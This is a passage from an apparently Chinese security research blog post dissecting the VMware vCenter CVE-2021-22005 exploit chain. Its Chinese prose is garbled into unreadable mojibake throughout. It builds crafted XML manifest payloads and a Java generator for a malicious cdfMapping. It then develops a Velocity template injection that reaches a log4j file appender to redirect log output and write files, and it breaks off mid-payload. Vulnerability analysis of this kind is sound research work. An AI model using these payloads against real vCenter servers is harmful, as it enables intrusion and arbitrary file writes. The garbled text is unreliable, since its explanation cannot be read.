‡ç­¾å¯¹åº”çš„è§£æå™¨:<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.JaxbCdfMappingParser#parse</code></p><p>58è¡Œé™åˆ¶äº†<cdfMapping>çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å¯¹åº”ç±»ä¸ºï¼š<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code>,æ‹¿åˆ°IndependentResultsMappingå¯¹è±¡åï¼Œè°ƒç”¨å…¶<code>build()</code>è¿”å›é‡æ–°æ„é€ çš„<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping</code>å¯¹è±¡</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/37.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/38.png"></p><p><code>&lt;indepedentResultsMapping&gt;</code>æ ‡ç­¾å¯¹åº”ç±»ï¼š<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/39.png"></p><p>åœ¨build()æ—¶ä¼šæ ¹æ®å±æ€§å€¼<code>resultSetMappings</code>é‡æ–°æ„å»º<code>IndependentResultsMapping</code>å¯¹è±¡.æ‰€ä»¥éœ€è¦åŠ ä¸ŠresultSetMappingså±æ€§å€¼ï¼Œè¿™éƒ¨åˆ†åé¢æ„é€ æ—¶ä¼šè®²è§£</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ï¼Œè§£æå™¨æ„å»ºå®ŒManifestå¯¹è±¡åå¼€å§‹æ£€æŸ¥querieså˜é‡ï¼š<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/40.png"></p><p>com.vmware.ph.phservice.cloud.dataapp.iternal.collector.CollectionTriggerTypeManifestParser#filterOnDemandQueries</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/41.png"></p><p>é™åˆ¶<code>&lt;request&gt;</code>çš„å­æ ‡ç­¾<code>&lt;query&gt;</code>å¿…é¡»åŒ…å«name,è°ƒæ•´ä¸ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">\</span>&quot;<span class="hljs-attr">aaa</span>\&quot;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>sss<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-2-å¯¹manifestToExecuteè¿›è¡Œæ”¶é›†æ“ä½œ"><a href="#3-2-2-å¯¹manifestToExecuteè¿›è¡Œæ”¶é›†æ“ä½œ" class="headerlink" title="3.2.2 å¯¹manifestToExecuteè¿›è¡Œæ”¶é›†æ“ä½œ"></a>3.2.2 å¯¹manifestToExecuteè¿›è¡Œæ”¶é›†æ“ä½œ</h4><p>æ„å»ºå¥½<code>Manifest</code>å¯¹è±¡ä¹‹åå°±åˆ°äº†ï¼š<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code>çš„ç¬¬äºŒæ­¥æ“ä½œ</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/42.png"></p><p>è·Ÿå…¥ï¼š<code>com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collect-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collectAndUpload-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#processStructuredDataCollectors</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/43.png"></p><p>è¿™é‡Œçš„å‡ æ­¥æ“ä½œåˆ†åˆ«ä¸ºï¼š<code>æ”¶é›†payloadsã€åˆ›å»ºè¿­ä»£å™¨ã€åˆ¤æ–­è¿­ä»£å™¨ã€ä¾æ¬¡è®¿é—®è¿­ä»£å™¨</code>ï¼Œåœ¨è®¿é—®è¿­ä»£å™¨æ—¶è§¦å‘map()æ˜¯å¯¼è‡´æœ¬æ¬¡æ¼æ´çš„ä¸»å› ã€‚ä¸‹é¢å¯¹è¿™ä¸‰éƒ¨åˆ†ä¾æ¬¡è®²è§£</p><h5 id="3-2-2-1-ç¬¬ä¸€éƒ¨åˆ†ï¼šæ”¶é›†payloads"><a href="#3-2-2-1-ç¬¬ä¸€éƒ¨åˆ†ï¼šæ”¶é›†payloads" class="headerlink" title="3.2.2.1 ç¬¬ä¸€éƒ¨åˆ†ï¼šæ”¶é›†payloads"></a>3.2.2.1 ç¬¬ä¸€éƒ¨åˆ†ï¼šæ”¶é›†payloads</h5><p>æœ€ç»ˆè¿”å›çš„æ˜¯é‡å†™äº†iterator()çš„<code>FluentIterable</code>å¯¹è±¡</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/44.png">ç›¸å½“äºä¼ªä»£ç ï¼š</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">fromIterable = <span class="hljs-keyword">this</span>.collectors<br><br>Function <span class="hljs-function"><span class="hljs-keyword">fun</span> = new Function<span class="hljs-type">&lt;CdfCollector, Iterable&lt;CollectedPayload&gt;</span>&gt;<span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">public</span> Iterable&lt;CollectedPayload&gt; apply(CdfCollector input) &#123;<br>        long startTimeNano = System.nanoTime();<br>        xxx<br>    &#125;<br>&#125;));<br><br>FluentIterable fl = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>        <span class="hljs-keyword">return</span> Iterators.transform(fromIterable.iterator(), <span class="hljs-function"><span class="hljs-keyword">fun</span>);</span><br>        &#125;<br>    &#125;;<br>&#125;<br><br>FluentIterable f2 = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>    <span class="hljs-keyword">return</span> Iterators.concat(Iterables.iterators(fl));<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">return</span> f2<br></code></pre></td></tr></table></figure><h5 id="3-2-2-2-ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ›å»ºè¿­ä»£å™¨"><a href="#3-2-2-2-ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ›å»ºè¿­ä»£å™¨" class="headerlink" title="3.2.2.2 ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ›å»ºè¿­ä»£å™¨"></a>3.2.2.2 ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ›å»ºè¿­ä»£å™¨</h5><p>å¼€å§‹è°ƒç”¨:<code>collectedPayloads.iterator()</code>,å³<code>f2.iterator()</code>,è°ƒç”¨é“¾ï¼š<code>f2.iterator()-&gt;f1.iterator()-&gt;Iterators.transform()-&gt;Iterators.concat()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/45.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/46.png"></p><p>æœ€ç»ˆ<code>concat()</code>è¿”å›äº†å®ç°hasNext()ã€next()ã€remove()çš„Iteratorå¯¹è±¡ï¼Œinputæ˜¯<code>TransformedIterator</code>å¯¹è±¡,ç›¸å½“äºï¼ˆä¼ªä»£ç ï¼‰ï¼š</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim">fromIterator = this.collectors.<span class="hljs-keyword">iterator</span>();<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator1 = new <span class="hljs-type">TransformedIterator</span>&lt;F, T&gt;(fromIterator) &#123;<br>    T transform(F <span class="hljs-keyword">from</span>) &#123;<br>    <span class="hljs-keyword">return</span> fun.apply(<span class="hljs-keyword">from</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator2 = new <span class="hljs-type">TransformedIterator</span>&lt;<span class="hljs-type">Iterable</span>&lt;? extends T&gt;, <span class="hljs-type">Iterator</span>&lt;? extends T&gt;&gt;(transformedIterator1) &#123;<br>    <span class="hljs-type">Iterator</span>&lt;? extends T&gt; transform(<span class="hljs-type">Iterable</span>&lt;? extends T&gt; <span class="hljs-keyword">from</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>.<span class="hljs-keyword">iterator</span>();<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-type">Iterator</span> iterator1 = new <span class="hljs-type">Iterator</span>&lt;T&gt;() &#123;<br>inputs = transformedIterator2;<br>    public boolean hasNext() <span class="hljs-meta">&#123;...&#125;</span><br>    public T next() <span class="hljs-meta">&#123;...&#125;</span><br>    public <span class="hljs-type">void</span> remove() <span class="hljs-meta">&#123;...&#125;</span><br>&#125;;<br><br><br><span class="hljs-keyword">return</span> iterator1;<br></code></pre></td></tr></table></figure><h5 id="3-2-2-2-ç¬¬ä¸‰éƒ¨åˆ†ï¼šåˆ¤æ–­è¿­ä»£å™¨"><a href="#3-2-2-2-ç¬¬ä¸‰éƒ¨åˆ†ï¼šåˆ¤æ–­è¿­ä»£å™¨" class="headerlink" title="3.2.2.2 ç¬¬ä¸‰éƒ¨åˆ†ï¼šåˆ¤æ–­è¿­ä»£å™¨"></a>3.2.2.2 ç¬¬ä¸‰éƒ¨åˆ†ï¼šåˆ¤æ–­è¿­ä»£å™¨</h5><p>æ¥ç€å¼€å§‹è°ƒç”¨<code>collectedPayloadsIterator.hasNext()</code>å³<code>iterator1.hasNext()</code>åˆ¤æ–­æ˜¯å¦next()å­˜åœ¨å€¼ï¼Œ<code>inputs.hasNext()-&gt;transformedIterator2.hasNext()-&gt;transformedIterator1#hasNext()-&gt;this.collectors.iterator().hasNext()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/47.png"></p><p>åˆ¤æ–­å­˜åœ¨åï¼Œè°ƒç”¨inputs.next()è¿›è¡Œèµ‹å€¼ï¼š<code>inputs.next()-&gt;transformedIterator2.next()-&gt;transformedIterator1#next()-&gt;this.collectors.iterator().next()-&gt;transformedIterator1.transform()-&gt;fun.apply()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/48.png"></p><p>è°ƒç”¨åˆ°<code>input.collect(manifest, queryService, context, pageSize);</code>,å°†æˆ‘ä»¬ä¼ å…¥çš„<code>&lt;query&gt;</code>ä¸<code>&lt;cdfMapping&gt;</code>èµ‹å€¼ç»™queriesã€payloadMappin</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/49.png"></p><p>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#collect</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/50.png"></p><p><code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#filterQueriesForExecution</code>é™åˆ¶äº†IndependentResultsMapping#_queryNameToResultSetMappingçš„entryè¦åŒ…å«<query>çš„nameå€¼å³ï¼š<code>&lt;query name=&quot;aaa&quot;&gt;    &lt;cdfMapping&gt;&lt;indepedentResultsMapping&gt;&lt;resultSetMappings&gt;&lt;entry&gt;&lt;key&gt;aaa&lt;/key&gt;&lt;/entry&gt;&lt;/resultSetMappings&gt;&lt;/indepedentResultsMapping&gt;</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/51.png"></p><p>æ·»åŠ queryä¹‹åè¿”å›å®ç°äº†iterator()çš„Iterableå¯¹è±¡ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œåˆ°<code>Iterables.transform(result, obfuscationFunction);</code>ï¼Œè¿”å›å®ç°äº†iterator()çš„FluentIterableç±»å¯¹è±¡</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/52.png"></p><p>æ¥ç€æ‰§è¡Œåˆ°<code>Iterables.concat(result, perfData);</code>ï¼Œè¿”å›å®ç°äº†iterator()çš„FluentIterableç±»å¯¹è±¡</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/53.png"></p><p>â€‹                                         &#x2F;<img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/54.png"></p><p>ç›¸å½“äºä¼ªä»£ç ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Iterable iterable2 = <span class="hljs-keyword">new</span> Iterable&lt;OUT&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;OUT&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">QueryServiceCollector</span>.</span></span>this.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_resultIteratorFactory</span>.</span></span>get<span class="hljs-constructor">Iterator(<span class="hljs-params">queryService</span>, <span class="hljs-params">responseMapping</span>, <span class="hljs-params">modifiedContext</span>, <span class="hljs-params">queriesForExecution</span>, <span class="hljs-params">pageSize</span>)</span>;<br>    &#125;<br>&#125;);<br><br><br>FluentIterable f3 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>transform(iterable2.iterator<span class="hljs-literal">()</span>, <span class="hljs-keyword">new</span> QueryServiceCdfCollector.<span class="hljs-constructor">ObfuscationFunction(<span class="hljs-params">this</span>.<span class="hljs-params">_obfuscator</span>, <span class="hljs-params">obfuscationRules</span>)</span>);<br>    &#125;<br>&#125;;<br><br>FluentIterable f4 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>concat(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterables</span>.</span></span>iterators(inputs));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨å®Œå†…å±‚çš„transformedIterator1åå¼€å§‹è°ƒç”¨transformedIterator2.transform()</p><p><code>transformedIterator2.transform()-&gt;from.iterator()-&gt;f4.iterator()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/55.png"></p><p>è°ƒç”¨åˆ°ä¸Šé¢å®šä¹‰çš„iterator()ï¼Œè¿”å›<code>responseMappingIterable.iterator()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/56.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/57.png"></p><h5 id="3-2-2-4-ç¬¬å››éƒ¨åˆ†ï¼šè®¿é—®è¿­ä»£å™¨"><a href="#3-2-2-4-ç¬¬å››éƒ¨åˆ†ï¼šè®¿é—®è¿­ä»£å™¨" class="headerlink" title="3.2.2.4 ç¬¬å››éƒ¨åˆ†ï¼šè®¿é—®è¿­ä»£å™¨"></a>3.2.2.4 ç¬¬å››éƒ¨åˆ†ï¼šè®¿é—®è¿­ä»£å™¨</h5><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/58.png"></p><p>com.vmware.cis.data.internal.provider.ProviderRepository#getProviderForModel  åˆ¤æ–­<code>&lt;targetType&gt;</code>æ ‡ç­¾å†…å®¹å¿…é¡»å­˜åœ¨äº_providerByModelä¸­,åŸå§‹expé‡‡ç”¨çš„æ˜¯â€œServiceInstanceâ€</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/59.png"></p><p>æ¥ç€è°ƒç”¨<code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector.ResultIteratorFactory#getIterator</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/60.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/61.png"></p><p>å¼€å§‹è°ƒç”¨ä¼ å…¥æ ‡ç­¾çš„map()</p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/62.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResultSetToCdfPayloadMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/63.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.SafeMappingWrapper#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/64.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/65.png"></p><p>ä½œè€…æ‰¾åˆ°äº†com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map()ä¸­å­˜åœ¨Velocityæ¨¡æ¿æ³¨å…¥</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/66.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/67.png"></p><p>æ¥ç€æˆ‘ä»¬ä½¿ç”¨ä»£ç ç”Ÿæˆ<cdfMapping>æ ‡ç­¾çš„å†…å®¹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-built_in">new</span> Test().testMarshalIndependMapping();<br>    &#125;<br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> testMarshalIndependMapping() throws <span class="hljs-keyword">Exception</span> &#123;<br>        ResourceItemToJsonLdMapping resourceItemToJsonLdMapping = <span class="hljs-built_in">new</span> ResourceItemToJsonLdMapping(&quot;a&quot;, &quot;b&quot;);<br>        List&lt;MappingBuilder&lt;NamedPropertiesResourceItem, ? extends CdfAble&gt;&gt; itemMappings = <span class="hljs-built_in">new</span> ArrayList();<br>        itemMappings.<span class="hljs-keyword">add</span>(resourceItemToJsonLdMapping);<br>        ResultSetToCdfPayloadMapping resultSetToCdfPayloadMapping = <span class="hljs-built_in">new</span> ResultSetToCdfPayloadMapping(itemMappings, <span class="hljs-built_in">new</span> VelocityResourceMapping());<br>        Map&lt;String, Mappings.<span class="hljs-keyword">Wrapper</span>&lt;ResultSetToCdfPayloadMapping&gt;&gt; resultSetMappings = <span class="hljs-built_in">new</span> HashMap();<br>        <span class="hljs-keyword">Wrapper</span> <span class="hljs-keyword">wrapper</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Wrapper</span>(resultSetToCdfPayloadMapping);<br>        resultSetMappings.put(&quot;keykey&quot;,<span class="hljs-keyword">wrapper</span>);<br>        IndependentResultsMapping independentResultsMapping = <span class="hljs-built_in">new</span> IndependentResultsMapping(resultSetMappings);<br>        marshal(independentResultsMapping);<br>    &#125;<br><br>    private <span class="hljs-type">void</span> marshal(<span class="hljs-keyword">Object</span> o) throws <span class="hljs-keyword">Exception</span> &#123;<br>        JAXBContext jaxbContext = JAXBContext.newInstance(ResourceItemToJsonLdMapping.<span class="hljs-keyword">class</span>,IndependentResultsMapping.<span class="hljs-keyword">class</span>, ResultSetToCdfPayloadMapping.<span class="hljs-keyword">class</span>);<br>        Marshaller marshaller = jaxbContext.createMarshaller();<br>        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, <span class="hljs-keyword">true</span>);<br>        marshaller.marshal(o, <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/68.png"></p><p>æ¥ç€æˆ‘ä»¬å°±å¯ä»¥åˆ°è¾¾è§¦å‘æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹äº†</p><h3 id="3-3-Velocityæ¨¡æ¿æ³¨å…¥"><a href="#3-3-Velocityæ¨¡æ¿æ³¨å…¥" class="headerlink" title="3.3 Velocityæ¨¡æ¿æ³¨å…¥"></a>3.3 Velocityæ¨¡æ¿æ³¨å…¥</h3><blockquote><p>è¿™éƒ¨åˆ†å†…å®¹æ˜¯å½“æ—¶å¤ç°1dayæ—¶çš„ä¸€äº›æˆªå›¾ï¼Œæ‰€ä»¥åªå…³æ³¨<mappingCode>æ ‡ç­¾å†…å®¹å³å¯</p></blockquote><p>è°ƒç”¨é“¾ï¼š</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/69.png"></p><p>å½“ä¼ é€’aaa å­—ç¬¦ä¸²æ—¶ï¼Œæ–­åˆ°<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</code><br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/70.png">  </p><p>åœ¨<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.velocity.VelocityHelper#static()</code>è£…è½½äº†contextå˜é‡çš„å€¼ï¼š</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/71.png"></p><p>ç»è¿‡è°ƒè¯•å‘ç°è¿™é‡Œçš„velocity  contextå¹¶ä¸åŒ…å«å¸¸è§çš„$requestã€$sessionå˜é‡ï¼Œå¯ç”¨å˜é‡å…±26ä¸ªï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ˜¯stringä¿¡æ¯ï¼Œæœ€åˆçœ‹åˆ°testbnullå¸ˆå‚…æˆªå›¾ï¼Œæ˜¯é€šè¿‡ä¿®æ”¹è¿™ä¸ªâ€GLOBAL-loggerâ€ä¸‹å±æ€§å€¼_fileNameè¾¾åˆ°å†™æ–‡ä»¶ç›®çš„ã€‚å¼€å§‹åˆ†æä¸‹</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/72.png">  </p><p>ç„¶åå¼€å§‹è°ƒè¯•ï¼š</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">velocityEngine.evaluate(substitutor, dummySw, logTag, &quot;<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>.<span class="hljs-variable">aai</span>)</span></span>##&quot;);<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/73.png">  </p><p>å‘ç°ç›´æ¥é€šè¿‡.æ‹¿ä¸åˆ°aaiè¿™ä¸ªå˜é‡ï¼ŒæŸ¥çœ‹parentå¯¹åº”ç±»<code>org.apache.log4j.spi.RootLogger</code>åŠå…¶çˆ¶ç±»<code>org.apache.log4j.Logger</code>ä¸å­˜åœ¨è¯¥å˜é‡ï¼Œåœ¨å…¶çˆ·çˆ·ç±»<code>org.apache.log4j.Category</code>æ‰¾è§äº†aaiå˜é‡</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/74.png">  </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/75.png">  </p><p>æ—¢ç„¶ç›´æ¥é€šè¿‡å±æ€§æ‹¿ä¸åˆ°ã€ä¹Ÿä¸èƒ½è°ƒç”¨superClassç­‰æ–¹æ³•ã€‚åœ¨<code>org.apache.log4j.Category</code>ç±»æœç´¢aaiçš„è°ƒç”¨ï¼Œå‘ç°<code>getAppender()</code>æ–¹æ³•å¯ä»¥é€šè¿‡å…¶å±æ€§<code>_delegate.name</code>ç›´æ¥æ‹¿åˆ°<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender</code>å¯¹è±¡,éƒ½çœä¸‹ç”¨aaiå»å¯»æ‰¾å±æ€§äº†</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/76.png">  </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/77.png">  </p><p>è€Œè¿™é‡Œçš„<code>_delegate.name</code>ä¸º<code>LOGFILE</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/78.png">  </p><p>ç°åœ¨å·²ç»æ‹¿åˆ°NonAppendingRollingFileAppenderå¯¹è±¡,å†è°ƒç”¨å±æ€§<code>_fileName</code>çš„<code>setter</code>æ–¹æ³•å³å¯ä¿®æ”¹</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/79.png">  </p><p>æ„é€ è¯­å¥æµ‹è¯•ï¼š</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(\<span 